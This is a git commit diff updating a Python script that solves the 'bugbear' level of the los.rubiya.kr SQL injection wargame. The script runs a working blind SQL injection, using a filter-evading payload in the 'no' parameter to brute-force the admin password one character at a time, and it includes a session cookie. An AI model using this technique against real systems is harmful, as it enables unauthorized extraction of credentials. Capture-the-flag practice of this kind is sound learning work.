5f67d9553417c29c772724df7b6f63059345269d
Woosuk Nam <wsuk.nam@gmail.com>
2022-10-09 19:14:56 +0900

    Solved(bugbear)

--- los.rubiya.kr/bugbear.py
+++ los.rubiya.kr/bugbear.py
@@ -2,7 +2,7 @@ import requests
 import string
 
 url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
-cookie = {'PHPSESSID': 'jett8kmnsi97cl8bu5naomvbdm'}
+cookie = {'PHPSESSID': 'etjjfoma5vf2n8kv2bs6e0nllo'}
 
 def pw_len():
     for pw_length in range(50):
@@ -17,15 +17,20 @@ def pw_find():
     length = int(pw_len())
     password = ""
     for i in range(length):
-        for value in range(33,127):
-            if hex(value) == "0x25":
+        for value in string.printable:
+            if value == "%":
                 continue
-            param = {"pw":"-1","no":"-1||no>1&&right(left(pw,{}),1) in({})#".format(i+1, hex(value))}
+            param = {"pw":"-1","no":"-1||no>1&&right(left(pw,{}),1)\nin(\"{}\")#".format(i+1, value)}
             print(param)
             req = requests.get(url, params=param, cookies=cookie)
             if "Hello admin" in req.text:
-                password += chr(value)
+                password += value
                 break
+        if password == "":
+            print("Not Found")
+            exit()
     print("Password:", password)
 
 pw_find()
+
+#52dc3991
